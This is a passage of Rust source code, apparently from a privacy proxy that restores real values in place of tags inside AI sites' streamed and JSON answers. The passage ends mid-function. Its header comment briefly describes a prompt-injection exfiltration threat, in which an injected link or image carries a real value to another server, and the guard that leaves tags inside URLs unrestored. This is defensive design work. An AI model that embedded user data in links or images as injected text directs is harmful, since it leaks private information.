//! Restoring real values in the answers of intercepted AI sites.
//!
//! - `text/event-stream`: events parsed incrementally; each JSON string leaf
//!   is restored by a stream restorer keyed by its JSON path (array indices
//!   included, plus the event name and a top-level `index`), or by the patch
//!   path `p` of chatgpt.com-style delta encoding (`{"p","o","v"}` events,
//!   bare `{"v"}` continuations, `patch` batches), so a tag split across
//!   events restores exactly. Non-JSON data shares one restorer per stream.
//! - `application/x-ndjson`: the same, one line per event.
//! - `application/json`: buffered (up to 16 MiB), every string leaf
//!   restored and the document re-serialised; `)]}'`-prefixed JSON-in-text
//!   (Gemini) line by line; larger documents through the JSON fragment
//!   restorer. A body that is not JSON passes through.
//! - `text/plain`: one stream restorer, unless the body starts like JSON
//!   (up to a string or an object, or a JSON value followed by another on a
//!   later line): then it is restored as `application/json` is, or passes
//!   through, never as text.
//! - Anything else (HTML included) passes through untouched: AI sites
//!   render answers from JSON and event streams, where values are text.
//!
//! Which answers are restored at all is decided per endpoint
//! ([`crate::sites::restore_rule`]); [`for_stream_only`] is the rewriter for
//! sites whose answers are restored only when they stream (a single JSON
//! document or a text body passes through there).
//!
//! Real values only ever land inside parsed JSON strings (re-serialised),
//! JSON-escaped in streamed JSON fragments, or in plain text; JSON carried
//! inside a string is restored at its own level. Tags inside URLs are never
//! restored ([`parda_wire::urlguard`]): a prompt-injected link or image cannot
//! carry a real value to another server.
//!
//! An event that leaves text held back (a possible tag prefix) is kept,
//! with every event after it, until the text is decided: the next event of
//! the same path carries it on, or, at a stop event or the end of the
//! stream, it is flushed into that held event. No event is invented.

use std::collections::{HashMap, HashSet, VecDeque};

use bytes::Bytes;
use parda_engine::{Engine, StreamRestorer};
use parda_wire::JsonFragRestorer;
use parda_wire::jsonfrag::ValueRestorer;
use parda_wire::sse::{SseEvent, SseParser, serialize};
use parda_wire::walk::{leaves, preserve_numbers};
use serde_json::Value;

use crate::StreamTransform;
use parda_wire::urlguard::Guarded;

/// The most held for one SSE event, NDJSON line or Google frame.
const MAX_ITEM_BYTES: usize = 16 * 1024 * 1024;
/// JSON bodies up to this size are restored as whole documents.
const MAX_JSON_BUFFER: usize = 16 * 1024 * 1024;
/// Events held back waiting for undecided text, at most (then flushed).
const MAX_HELD_EVENTS: usize = 64;
const MAX_HELD_BYTES: usize = 1024 * 1024;
/// Google's anti-JSON-hijacking prefix.
const XSSI_PREFIX: &[u8] = b")]}'";
/// The restorer key of non-JSON data.
const TEXT_KEY: &str = "\u{0}text";
/// JSON carried inside strings is restored this many levels deep.
const MAX_NESTED_JSON: usize = 4;
/// Keys whose streamed values are fragments of a JSON document.
const JSON_DELTA_KEYS: &[&str] = &["partial_json", "arguments"];

/// A rewriter for one response body of type `content_type`.
pub(crate) fn for_content_type(
    engine: &Engine,
    scope: &str,
    content_type: &str,
) -> Box<dyn StreamTransform> {
    for_content_type_capped(engine, scope, content_type, MAX_ITEM_BYTES)
}

/// [`for_content_type`] with `cap` bytes at most held for one event, line or
/// frame: a larger one goes out as it came and the rest of the stream
/// passes through unrestored.
pub(crate) fn for_content_type_capped(
    engine: &Engine,
    scope: &str,
    content_type: &str,
    cap: usize,
) -> Box<dyn StreamTransform> {
    build(engine, scope, content_type, cap, true)
}

/// A rewriter for one streamed answer: like [`for_content_type`] for
/// `text/event-stream`, NDJSON and several JSON values under a JSON type,
/// but a single JSON document (Google frames included), a text body or any
/// other type passes through unrestored.
pub(crate) fn for_stream_only(
    engine: &Engine,
    scope: &str,
    content_type: &str,
) -> Box<dyn StreamTransform> {
    build(engine, scope, content_type, MAX_ITEM_BYTES, false)
}

/// The rewriter for `content_type`; `documents`: whether single JSON
/// documents and text bodies are restored too.
fn build(
    engine: &Engine,
    scope: &str,
    content_type: &str,
    cap: usize,
    documents: bool,
) -> Box<dyn StreamTransform> {
    let media = content_type
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    match media.as_str() {
        "text/event-stream" => Box::new(SseRestore {
            parser: SseParser::default(),
            events: Events::new(engine, scope),
            cap,
            raw: false,
        }),
        "application/x-ndjson"
        | "application/ndjson"
        | "application/jsonl"
        | "application/x-jsonlines"
        | "application/stream+json" => Box::new(NdjsonRestore::new(engine, scope, cap)),
        m if m == "application/json" || m == "text/json" || m.ends_with("+json") => {
            Box::new(JsonRestore::new(engine, scope, cap, documents))
        }
        "text/plain" if documents => Box::new(PlainRestore {
            engine: engine.clone(),
            scope: scope.to_string(),
            mode: PlainMode::Sniff(Vec::new(), 0),
        }),
        _ => Box::new(Passthrough),
    }
}

/// A rewriter that changes nothing.
pub(crate) fn passthrough() -> Box<dyn StreamTransform> {
    Box::new(Passthrough)
}

/// Bodies parda does not rewrite (images, binaries, unknown types).
struct Passthrough;

impl StreamTransform for Passthrough {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        Bytes::copy_from_slice(chunk)
    }

    fn finish(&mut self) -> Bytes {
        Bytes::new()
    }

    fn is_passthrough(&self) -> bool {
        true
    }
}

/// Plain text, or JSON text (real values are JSON-escaped); tags inside
/// URLs are left alone either way.
enum TextRestorer {
    Plain(Guarded<StreamRestorer>),
    Json(JsonFragRestorer),
}

impl TextRestorer {
    fn plain(engine: &Engine, scope: &str) -> Self {
        TextRestorer::Plain(Guarded::new(engine.stream_restorer(scope).url_safe()))
    }

    fn json(engine: &Engine, scope: &str) -> Self {
        let (engine, scope) = (engine.clone(), scope.to_string());
        TextRestorer::Json(JsonFragRestorer::with_values(Box::new(move || {
            Box::new(Guarded::new(engine.stream_restorer(&scope).url_safe()))
        })))
    }

    fn push(&mut self, text: &str) -> String {
        match self {
            TextRestorer::Plain(r) => r.push(text),
            TextRestorer::Json(r) => r.push(text),
        }
    }

    fn finish(&mut self) -> String {
        match self {
            TextRestorer::Plain(r) => r.finish(),
            TextRestorer::Json(r) => r.finish(),
        }
    }

    fn pending_len(&self) -> usize {
        match self {
            TextRestorer::Plain(r) => r.pending_len(),
            TextRestorer::Json(r) => r.pending_len(),
        }
    }
}

/// A byte stream restored as UTF-8 text. A character split across chunks
/// waits for its rest; at the first invalid byte the stream stops being
/// rewritten and the rest passes through as it came.
struct TextStream {
    restorer: TextRestorer,
    carry: Vec<u8>,
    raw: bool,
}

impl TextStream {
    fn new(restorer: TextRestorer) -> Self {
        TextStream {
            restorer,
            carry: Vec::new(),
            raw: false,
        }
    }

    fn push_bytes(&mut self, chunk: &[u8]) -> Vec<u8> {
        if self.raw {
            return chunk.to_vec();
        }
        self.carry.extend_from_slice(chunk);
        let (valid, invalid) = match std::str::from_utf8(&self.carry) {
            Ok(_) => (self.carry.len(), false),
            Err(e) => (e.valid_up_to(), e.error_len().is_some()),
        };
        let text = String::from_utf8_lossy(&self.carry[..valid]);
        let mut out = self.restorer.push(&text).into_bytes();
        if invalid {
            out.extend_from_slice(self.restorer.finish().as_bytes());
            out.extend_from_slice(&self.carry[valid..]);
            self.carry.clear();
            self.raw = true;
        } else {
            self.carry.drain(..valid);
        }
        out
    }

    fn finish_bytes(&mut self) -> Vec<u8> {
        if self.raw {
            return Vec::new();
        }
        let mut out = self.restorer.finish().into_bytes();
        // An incomplete character at the very end goes out as it came.
        out.append(&mut self.carry);
        out
    }
}

impl StreamTransform for TextStream {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        Bytes::from(self.push_bytes(chunk))
    }

    fn finish(&mut self) -> Bytes {
        Bytes::from(self.finish_bytes())
    }
}

enum PlainMode {
    /// Not decided yet (leading whitespace, or the start of what may be
    /// JSON), and how many leading bytes are known to be a BOM or
    /// whitespace (read once).
    Sniff(Vec<u8>, usize),
    Text(TextStream),
    /// Starts like JSON: restored as one document or as JSON lines, or
    /// passed through, never as text.
    Json(JsonRestore),
    /// Too large to buffer: passed through.
    Raw,
}

/// The longest start of a text/plain answer read to decide whether it is
/// JSON; past it, a start that is still JSON so far counts as JSON.
const SNIFF_MAX: usize = 1024;

/// What a text/plain answer is, from its start.
#[derive(Debug, PartialEq, Eq)]
enum PlainKind {
    Text,
    Json,
    /// Only whitespace, at the end.
    Blank,
}

/// Decide what `buf` (the start of a text/plain answer; all of it when
/// `end`) is, or `None` to wait for more. JSON is a start that reads as
/// JSON up to a string or an object (`{"`, `["`, `[{`), a JSON string
/// literal on its own, or a JSON value followed by another on a later line;
/// anything that stops being JSON before that is text (`[NAME_1] said`,
/// `[1] see`, `"Hi" said`).
fn sniff_plain(buf: &[u8], end: bool) -> Option<PlainKind> {
    let body = buf.strip_prefix(b"\xEF\xBB\xBF").unwrap_or(buf);
    let lead = body.iter().take_while(|b| b.is_ascii_whitespace()).count();
    let rest = &body[lead..];
    let t = match std::str::from_utf8(rest) {
        Ok(t) => t,
        Err(e) if e.error_len().is_none() => {
            std::str::from_utf8(&rest[..e.valid_up_to()]).unwrap_or("")
        }
        Err(_) => return Some(PlainKind::Text),
    };
    let more = |t: &str| (end || t.len() > SNIFF_MAX).then_some(PlainKind::Json);
    match t.chars().next() {
        None if end => Some(PlainKind::Blank),
        None => None,
        Some('{' | '[') => match json_start(t) {
            JsonStart::Clear | JsonStart::Broken => Some(PlainKind::Json),
            JsonStart::Open => more(t),
            JsonStart::Not => Some(PlainKind::Text),
            JsonStart::Closed(at) => after_value(&t[at..]).or_else(|| more(t)),
        },
        Some('"') => match string_end(t) {
            Some(at) => after_value(&t[at..]).or_else(|| more(t)),
            None => more(t),
        },
        Some(_) => Some(PlainKind::Text),
    }
}

/// After a complete JSON value: another value on a later line makes JSON
/// lines, other text makes it all text; `None` while only whitespace
/// follows.
fn after_value(rest: &str) -> Option<PlainKind> {
    let ws = rest.len() - rest.trim_start().len();
    match rest[ws..].chars().next() {
        None => None,
        Some('{' | '[' | '"') if rest[..ws].contains('\n') => Some(PlainKind::Json),
        Some(_) => Some(PlainKind::Text),
    }
}

/// Where the JSON string literal `t` starts with ends (after its closing
/// quote), if it does.
fn string_end(t: &str) -> Option<usize> {
    let b = t.as_bytes();
    let mut i = 1;
    while i < b.len() {
        match b[i] {
            b'\\' => i += 2,
            b'"' => return Some(i + 1),
            _ => i += 1,
        }
    }
    None
}

/// `text/plain`: text, unless it starts like JSON (sites serve JSON as
/// text/plain too), which is restored as JSON or passes through.
struct PlainRestore {
    engine: Engine,
    scope: String,
    mode: PlainMode,
}

impl PlainRestore {
    /// Leave sniffing as `kind`, sending what was held.
    fn decide(&mut self, kind: PlainKind, held: Vec<u8>) -> Vec<u8> {
        match kind {
            PlainKind::Blank => {
                self.mode = PlainMode::Raw;
                held
            }
            PlainKind::Text => {
                let mut t = TextStream::new(TextRestorer::plain(&self.engine, &self.scope));
                let out = t.push_bytes(&held);
                self.mode = PlainMode::Text(t);
                out
            }
            PlainKind::Json => {
                let mut j = JsonRestore::new(&self.engine, &self.scope, MAX_ITEM_BYTES, true);
                let out = j.push(&held).to_vec();
                self.mode = PlainMode::Json(j);
                out
            }
        }
    }
}

impl StreamTransform for PlainRestore {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        match &mut self.mode {
            PlainMode::Raw => Bytes::copy_from_slice(chunk),
            PlainMode::Text(t) => Bytes::from(t.push_bytes(chunk)),
            PlainMode::Json(j) => j.push(chunk),
            PlainMode::Sniff(buf, lead) => {
                buf.extend_from_slice(chunk);
                if *lead == 0 && buf.starts_with(b"\xEF\xBB\xBF") {
                    *lead = 3;
                }
                if *lead > 0 || buf.len() >= 3 || !b"\xEF\xBB\xBF".starts_with(buf) {
                    while *lead < buf.len() && buf[*lead].is_ascii_whitespace() {
                        *lead += 1;
                    }
                }
                let kind = match sniff_plain(&buf[*lead..], false) {
                    Some(kind) => kind,
                    // Only whitespace, more than a document can be.
                    None if buf.len() > MAX_JSON_BUFFER => PlainKind::Blank,
                    None => return Bytes::new(),
                };
                let held = std::mem::take(buf);
                Bytes::from(self.decide(kind, held))
            }
        }
    }

    fn finish(&mut self) -> Bytes {
        match std::mem::replace(&mut self.mode, PlainMode::Raw) {
            PlainMode::Raw => Bytes::new(),
            PlainMode::Text(mut t) => Bytes::from(t.finish_bytes()),
            PlainMode::Json(mut j) => j.finish(),
            PlainMode::Sniff(buf, _) => {
                let kind = sniff_plain(&buf, true).unwrap_or(PlainKind::Blank);
                let mut out = self.decide(kind, buf);
                out.extend_from_slice(&self.finish());
                Bytes::from(out)
            }
        }
    }
}

enum JsonMode {
    /// Buffered (and scanned for a second top-level value).
    Buffer(Vec<u8>, TopLevel),
    Stream(TextStream),
    /// `)]}'`-prefixed: Google's length-prefixed frames.
    Frames(Frames),
    /// Several JSON values one per line: an NDJSON stream after all.
    Lines(NdjsonRestore),
    /// Passed through unrestored (a document where only streams are).
    Raw,
}

/// Where the first top-level JSON value of a body ends, and whether
/// another follows on a later line (bytes are scanned once).
#[derive(Default)]
struct TopLevel {
    pos: usize,
    depth: u32,
    in_string: bool,
    escaped: bool,
    started: bool,
    /// The first value is not an object or array: never several values.
    scalar: bool,
    done: bool,
    newline_after: bool,
}

impl TopLevel {
    /// Scan the new bytes of `buf`: true once a second value starts on a
    /// line after the first.
    fn more_values(&mut self, buf: &[u8]) -> bool {
        while self.pos < buf.len() && !self.scalar {
            let b = buf[self.pos];
            self.pos += 1;
            if self.done {
                if b == b'\n' {
                    self.newline_after = true;
                } else if !b.is_ascii_whitespace() {
                    return self.newline_after;
                }
                continue;
            }
            if !self.started {
                match b {
                    b'{' | b'[' => {
                        self.started = true;
                        self.depth = 1;
                    }
                    0xef | 0xbb | 0xbf => {}
                    b if b.is_ascii_whitespace() => {}
                    _ => self.scalar = true,
                }
                continue;
            }
            if self.in_string {
                match (self.escaped, b) {
                    (true, _) => self.escaped = false,
                    (false, b'\\') => self.escaped = true,
                    (false, b'"') => self.in_string = false,
                    _ => {}
                }
                continue;
            }
            match b {
                b'"' => self.in_string = true,
                b'{' | b'[' => self.depth += 1,
                b'}' | b']' => {
                    self.depth -= 1;
                    if self.depth == 0 {
                        self.done = true;
                    }
                }
                _ => {}
            }
        }
        false
    }
}

/// A JSON document: restored whole when it fits the buffer.
struct JsonRestore {
    engine: Engine,
    scope: String,
    cap: usize,
    /// False: only a stream of JSON values is restored; one document (or
    /// Google frames) passes through as it came.
    documents: bool,
    mode: JsonMode,
}

impl JsonRestore {
    fn new(engine: &Engine, scope: &str, cap: usize, documents: bool) -> Self {
        JsonRestore {
            engine: engine.clone(),
            scope: scope.to_string(),
            cap,
            documents,
            mode: JsonMode::Buffer(Vec::new(), TopLevel::default()),
        }
    }
}

impl StreamTransform for JsonRestore {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        let (buf, top) = match &mut self.mode {
            JsonMode::Stream(s) => return Bytes::from(s.push_bytes(chunk)),
            JsonMode::Frames(f) => return Bytes::from(f.push(chunk)),
            JsonMode::Lines(l) => return l.push(chunk),
            JsonMode::Raw => return Bytes::copy_from_slice(chunk),
            JsonMode::Buffer(buf, top) => {
                buf.extend_from_slice(chunk);
                (buf, top)
            }
        };
        if buf.len() >= XSSI_PREFIX.len() && buf.starts_with(XSSI_PREFIX) {
            let held = std::mem::take(buf);
            if !self.documents {
                self.mode = JsonMode::Raw;
                return Bytes::from(held);
            }
            // JSON inside text, sent in pieces: frame by frame.
            let mut frames = Frames::new(&self.engine, &self.scope, self.cap);
            let out = frames.push(&held);
            self.mode = JsonMode::Frames(frames);
            return Bytes::from(out);
        }
        if top.more_values(buf) {
            // A stream of JSON values under a JSON content type.
            let held = std::mem::take(buf);
            let mut lines = NdjsonRestore::new(&self.engine, &self.scope, self.cap);
            let out = lines.push(&held);
            self.mode = JsonMode::Lines(lines);
            return out;
        }
        if !self.documents && (top.scalar || buf.len() > MAX_JSON_BUFFER) {
            // One value, never restored here: no need to hold it longer.
            let held = std::mem::take(buf);
            self.mode = JsonMode::Raw;
            return Bytes::from(held);
        }
        if buf.len() <= MAX_JSON_BUFFER {
            return Bytes::new();
        }
        let held = std::mem::take(buf);
        let mut stream = TextStream::new(TextRestorer::json(&self.engine, &self.scope));
        let out = stream.push_bytes(&held);
        self.mode = JsonMode::Stream(stream);
        Bytes::from(out)
    }

    fn finish(&mut self) -> Bytes {
        match &mut self.mode {
            JsonMode::Stream(s) => Bytes::from(s.finish_bytes()),
            JsonMode::Frames(f) => Bytes::from(f.finish()),
            JsonMode::Lines(l) => l.finish(),
            JsonMode::Raw => Bytes::new(),
            JsonMode::Buffer(buf, _) => {
                let raw = std::mem::take(buf);
                if !self.documents {
                    return Bytes::from(raw);
                }
                if raw.starts_with(XSSI_PREFIX) {
                    let mut frames = Frames::new(&self.engine, &self.scope, self.cap);
                    let mut out = frames.push(&raw);
                    out.extend(frames.finish());
                    return Bytes::from(out);
                }
                Bytes::from(restore_document(&self.engine, &self.scope, raw))
            }
        }
    }
}

/// Restore every string leaf of a JSON document; the exact bytes when
/// nothing changed. A body that is not JSON passes through.
fn restore_document(engine: &Engine, scope: &str, raw: Vec<u8>) -> Vec<u8> {
    let Ok(v) = parda_wire::body::parse_json(&raw) else {
        return raw;
    };
    restore_json_value(engine, scope, &raw, v).unwrap_or(raw)
}

/// Restore the string leaves of `v` (parsed from `raw`); the re-serialised
/// document when a leaf changed.
fn restore_json_value(engine: &Engine, scope: &str, raw: &[u8], mut v: Value) -> Option<Vec<u8>> {
    let mut changed = false;
    leaves(&mut v, &mut |s: &mut String| {
        changed |= restore_string(engine, scope, s, 0);
    });
    changed.then(|| preserve_numbers(raw, serde_json::to_vec(&v).unwrap_or_default()))
}

/// A JSON object or array carried in a string, if `s` is one.
fn json_container(s: &str) -> Option<Value> {
    let t = s.trim();
    let bracketed =
        (t.starts_with('{') && t.ends_with('}')) || (t.starts_with('[') && t.ends_with(']'));
    if !bracketed {
        return None;
    }
    serde_json::from_str::<Value>(t)
        .ok()
        .filter(|v| v.is_object() || v.is_array())
}

/// Restore one whole string value in place. JSON inside it is restored at
/// its own level (so a real value is escaped where it lands); in text, tags
/// inside URLs stay tags. Returns whether it changed.
fn restore_string(engine: &Engine, scope: &str, s: &mut String, depth: usize) -> bool {
    if s.is_empty() {
        return false;
    }
    if depth < MAX_NESTED_JSON
        && let Some(mut inner) = json_container(s)
    {
        let mut changed = false;
        leaves(&mut inner, &mut |t: &mut String| {
            changed |= restore_string(engine, scope, t, depth + 1);
        });
        if changed {
            let out = preserve_numbers(s.as_bytes(), inner.to_string().into_bytes());
            *s = String::from_utf8(out)
                .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned());
        }
        return changed;
    }
    let mut r = Guarded::new(engine.stream_restorer(scope).url_safe());
    let mut out = r.push(s);
    out.push_str(&r.finish());
    if out == *s {
        return false;
    }
    *s = out;
    true
}

/// Google's length-prefixed frames after `)]}'`: `<digits><payload>`, the
/// number counting the payload in UTF-16 code units from right after the
/// digits. Each frame's JSON is restored (each is a snapshot) and its length
/// recomputed; a frame that is not JSON passes with its own length, and
/// text that is not framed passes as it came.
struct Frames {
    engine: Engine,
    scope: String,
    cap: usize,
    /// Bytes not yet sent; consumed ones are dropped once per push.
    buf: Vec<u8>,
    prefix_done: bool,
    /// The frame being read, once its length is known.
    frame: Option<FrameScan>,
    /// Gave up on framing: the rest passes through.
    raw: bool,
}

/// How far a frame's payload has been measured: every byte is read once,
/// whatever the chunking.
#[derive(Debug, Clone, Copy)]
struct FrameScan {
    digits: usize,
    /// The payload length in UTF-16 code units.
    units: usize,
    /// Payload bytes measured so far (whole characters).
    bytes: usize,
    /// UTF-16 code units in them.
    counted: usize,
}

/// Where measuring a payload got to.
#[derive(Debug, PartialEq, Eq)]
enum Measure {
    /// The payload is this many bytes.
    Done(usize),
    /// More bytes are needed.
    Need,
    /// Not valid (bad UTF-8, or the count ends inside a character).
    Invalid,
}

impl FrameScan {
    /// Count on through `payload` (the frame's payload bytes received so
    /// far), reading only bytes not measured before and no further than the
    /// frame can reach (a UTF-16 code unit is at most 4 UTF-8 bytes).
    fn measure(&mut self, payload: &[u8]) -> Measure {
        loop {
            if self.counted == self.units {
                return Measure::Done(self.bytes);
            }
            let new = &payload[self.bytes..];
            let reach = (self.units - self.counted)
                .saturating_mul(4)
                .saturating_add(4);
            let window = &new[..new.len().min(reach)];
            let (text, invalid) = match std::str::from_utf8(window) {
                Ok(t) => (t, false),
                Err(e) => (
                    std::str::from_utf8(&window[..e.valid_up_to()]).unwrap_or_default(),
                    e.error_len().is_some(),
                ),
            };
            for c in text.chars() {
                self.counted += c.len_utf16();
                self.bytes += c.len_utf8();
                if self.counted == self.units {
                    return Measure::Done(self.bytes);
                }
                if self.counted > self.units {
                    return Measure::Invalid;
                }
            }
            if invalid {
                return Measure::Invalid;
            }
            if window.len() == new.len() {
                // All received bytes read (a character may be incomplete).
                return Measure::Need;
            }
        }
    }
}

/// At most this many digits in a frame length.
const MAX_FRAME_DIGITS: usize = 12;

impl Frames {
    fn new(engine: &Engine, scope: &str, cap: usize) -> Self {
        Frames {
            engine: engine.clone(),
            scope: scope.to_string(),
            cap,
            buf: Vec::new(),
            prefix_done: false,
            frame: None,
            raw: false,
        }
    }

    fn push(&mut self, chunk: &[u8]) -> Vec<u8> {
        if self.raw {
            return chunk.to_vec();
        }
        self.buf.extend_from_slice(chunk);
        let mut out = Vec::new();
        let used = self.frames(&mut out);
        if self.raw {
            out.extend_from_slice(&self.buf[used..]);
            self.buf = Vec::new();
        } else {
            self.buf.drain(..used);
        }
        out
    }

    /// Restore every complete frame of `buf` into `out`; returns how many
    /// bytes of `buf` were used (sets `raw` on giving up).
    fn frames(&mut self, out: &mut Vec<u8>) -> usize {
        let mut at = 0;
        loop {
            let rest = &self.buf[at..];
            if !self.prefix_done {
                // `)]}'` and its line ending.
                match rest.iter().take(65).position(|&b| b == b'\n') {
                    Some(i) => {
                        out.extend_from_slice(&rest[..=i]);
                        at += i + 1;
                        self.prefix_done = true;
                        continue;
                    }
                    None if rest.len() > 64 => return self.give_up(at),
                    None => return at,
                }
            }
            let scan = match self.frame {
                Some(scan) => scan,
                None => {
                    let ws = rest.iter().take_while(|b| b.is_ascii_whitespace()).count();
                    out.extend_from_slice(&rest[..ws]);
                    at += ws;
                    let rest = &rest[ws..];
                    if rest.is_empty() {
                        return at;
                    }
                    let digits = rest
                        .iter()
                        .take(MAX_FRAME_DIGITS + 1)
                        .take_while(|b| b.is_ascii_digit())
                        .count();
                    if digits == 0 || digits > MAX_FRAME_DIGITS {
                        return self.give_up(at);
                    }
                    if digits == rest.len() {
                        return at;
                    }
                    let Ok(units) = std::str::from_utf8(&rest[..digits])
                        .unwrap_or("")
                        .parse::<usize>()
                    else {
                        return self.give_up(at);
                    };
                    FrameScan {
                        digits,
                        units,
                        bytes: 0,
                        counted: 0,
                    }
                }
            };
            let mut scan = scan;
            let rest = &self.buf[at..];
            match scan.measure(&rest[scan.digits..]) {
                Measure::Done(n) => {
                    let frame = &rest[..scan.digits + n];
                    out.extend(self.restore_frame(frame, scan.digits));
                    at += scan.digits + n;
                    self.frame = None;
                }
                Measure::Need if rest.len() <= self.cap => {
                    self.frame = Some(scan);
                    return at;
                }
                _ => return self.give_up(at),
            }
        }
    }

    /// One frame (`digits` digits, then the payload): restored with its
    /// length recomputed, or as it came.
    fn restore_frame(&self, frame: &[u8], digits: usize) -> Vec<u8> {
        let payload = std::str::from_utf8(&frame[digits..]).unwrap_or_default();
        let trimmed = payload.trim();
        let restored = parda_wire::body::parse_json(trimmed.as_bytes())
            .ok()
            .and_then(|v| restore_json_value(&self.engine, &self.scope, trimmed.as_bytes(), v));
        let Some(json) = restored else {
            return frame.to_vec();
        };
        let lead = payload.len() - payload.trim_start().len();
        let tail = payload.len() - payload.trim_end().len();
        let mut new = payload.as_bytes()[..lead].to_vec();
        new.extend(json);
        new.extend_from_slice(&payload.as_bytes()[payload.len() - tail..]);
        let new_payload = String::from_utf8_lossy(&new).into_owned();
        let mut out = new_payload.encode_utf16().count().to_string().into_bytes();
        out.extend(new_payload.into_bytes());
        out
    }

    /// Stop framing: what is left of `buf` from `at` on passes as it came.
    fn give_up(&mut self, at: usize) -> usize {
        self.raw = true;
        self.frame = None;
        at
    }

    fn finish(&mut self) -> Vec<u8> {
        self.frame = None;
        std::mem::take(&mut self.buf)
    }
}

/// A server-sent-event stream.
struct SseRestore {
    parser: SseParser,
    events: Events,
    cap: usize,
    /// An event was too large: the rest passes through.
    raw: bool,
}

impl StreamTransform for SseRestore {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        if self.raw {
            return Bytes::copy_from_slice(chunk);
        }
        let mut out = Vec::new();
        for ev in self.parser.feed(chunk) {
            render_all(self.events.on_item(Item::sse(ev)), &mut out);
        }
        if self.parser.buffered() > self.cap {
            render_all(self.events.finish(), &mut out);
            out.extend_from_slice(&self.parser.take_buffered());
            self.raw = true;
        }
        Bytes::from(out)
    }

    fn finish(&mut self) -> Bytes {
        if self.raw {
            return Bytes::new();
        }
        let mut out = Vec::new();
        if let Some(ev) = self.parser.finish() {
            render_all(self.events.on_item(Item::sse(ev)), &mut out);
        }
        render_all(self.events.finish(), &mut out);
        Bytes::from(out)
    }
}

/// Newline-delimited JSON: one item per line.
struct NdjsonRestore {
    buf: Vec<u8>,
    /// Bytes of `buf` known to hold no newline.
    scanned: usize,
    events: Events,
    cap: usize,
    /// A line was too large: the rest passes through.
    raw: bool,
}

impl NdjsonRestore {
    fn new(engine: &Engine, scope: &str, cap: usize) -> Self {
        NdjsonRestore {
            buf: Vec::new(),
            scanned: 0,
            events: Events::new(engine, scope),
            cap,
            raw: false,
        }
    }
}

impl StreamTransform for NdjsonRestore {
    fn push(&mut self, chunk: &[u8]) -> Bytes {
        if self.raw {
            return Bytes::copy_from_slice(chunk);
        }
        self.buf.extend_from_slice(chunk);
        let mut out = Vec::new();
        // Lines are taken from `start` on; the buffer is shifted once.
        let mut start = 0;
        while let Some(i) = self.buf[start + self.scanned..]
            .iter()
            .position(|&b| b == b'\n')
        {
            let end = start + self.scanned + i + 1;
            let line = self.buf[start..end].to_vec();
            start = end;
            self.scanned = 0;
            if line.len() > self.cap {
                render_all(self.events.finish(), &mut out);
                out.extend(line);
                out.extend_from_slice(&self.buf[start..]);
                self.buf = Vec::new();
                self.raw = true;
                return Bytes::from(out);
            }
            render_all(self.events.on_item(Item::line(line)), &mut out);
        }
        self.buf.drain(..start);
        self.scanned = self.buf.len();
        if self.buf.len() > self.cap {
            render_all(self.events.finish(), &mut out);
            out.append(&mut self.buf);
            self.raw = true;
        }
        Bytes::from(out)
    }

    fn finish(&mut self) -> Bytes {
        if self.raw {
            return Bytes::new();
        }
        let mut out = Vec::new();
        if !self.buf.is_empty() {
            let line = std::mem::take(&mut self.buf);
            render_all(self.events.on_item(Item::line(line)), &mut out);
        }
        self.scanned = 0;
        render_all(self.events.finish(), &mut out);
        Bytes::from(out)
    }
}

fn render_all(items: Vec<Item>, out: &mut Vec<u8>) {
    for item in items {
        out.extend_from_slice(&item.render());
    }
}

/// One step of a path inside a JSON value.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Seg {
    Key(String),
    Index(usize),
}

/// Where a restorer key's latest text sits in an item.
#[derive(Debug, Clone)]
enum Leaf {
    Json(Vec<Seg>),
    Data,
}

/// One SSE event or NDJSON line.
struct Item {
    /// Exactly what arrived: unchanged items go out as they came.
    raw: Bytes,
    sse: Option<SseEvent>,
    /// The NDJSON line ending (`\n`, `\r\n` or none).
    ending: &'static str,
    /// The SSE data or the NDJSON line.
    data: String,
    json: Option<Value>,
    /// Restored non-JSON data.
    text: Option<String>,
    changed: bool,
}

impl Item {
    fn sse(ev: SseEvent) -> Self {
        let raw = ev.raw.clone().unwrap_or_else(|| serialize(&ev));
        Item {
            raw,
            data: ev.data.clone(),
            sse: Some(ev),
            ending: "",
            json: None,
            text: None,
            changed: false,
        }
    }

    fn line(bytes: Vec<u8>) -> Self {
        let (body, ending) = if bytes.ends_with(b"\r\n") {
            (&bytes[..bytes.len() - 2], "\r\n")
        } else if bytes.ends_with(b"\n") {
            (&bytes[..bytes.len() - 1], "\n")
        } else {
            (&bytes[..], "")
        };
        Item {
            data: String::from_utf8_lossy(body).into_owned(),
            raw: Bytes::from(bytes),
            sse: None,
            ending,
            json: None,
            text: None,
            changed: false,
        }
    }

    /// The SSE `event:` name, `""` for NDJSON.
    fn name(&self) -> &str {
        match &self.sse {
            Some(ev) => ev.event.as_deref().unwrap_or("message"),
            None => "",
        }
    }

    fn render(self) -> Bytes {
        if !self.changed {
            return self.raw;
        }
        let data = match (&self.json, self.text) {
            (Some(v), _) => {
                let json = serde_json::to_vec(v).unwrap_or_default();
                let json = preserve_numbers(self.data.as_bytes(), json);
                String::from_utf8(json)
                    .unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
            }
            (None, Some(t)) => t,
            (None, None) => self.data,
        };
        match self.sse {
            Some(mut ev) => {
                ev.set_data(data);
                serialize(&ev)
            }
            None => Bytes::from(data + self.ending),
        }
    }
}

/// Add flushed text at `leaf` of an item's (taken-out) JSON or data.
fn append_at(
    json: Option<&mut Value>,
    text: &mut Option<String>,
    data: &str,
    leaf: &Leaf,
    tail: &str,
) {
    match leaf {
        Leaf::Data => text.get_or_insert_with(|| data.to_string()).push_str(tail),
        Leaf::Json(path) => {
            if let Some(Value::String(s)) = json.and_then(|v| pointer_mut(v, path)) {
                s.push_str(tail);
            }
        }
    }
}

fn pointer_mut<'a>(v: &'a mut Value, path: &[Seg]) -> Option<&'a mut Value> {
    let mut cur = v;
    for seg in path {
        cur = match seg {
            Seg::Key(k) => cur.get_mut(k.as_str())?,
            Seg::Index(i) => cur.get_mut(*i)?,
        };
    }
    Some(cur)
}

/// The paths of every string leaf of `v`, in document order.
fn leaf_paths(v: &Value, path: &mut Vec<Seg>, out: &mut Vec<Vec<Seg>>) {
    match v {
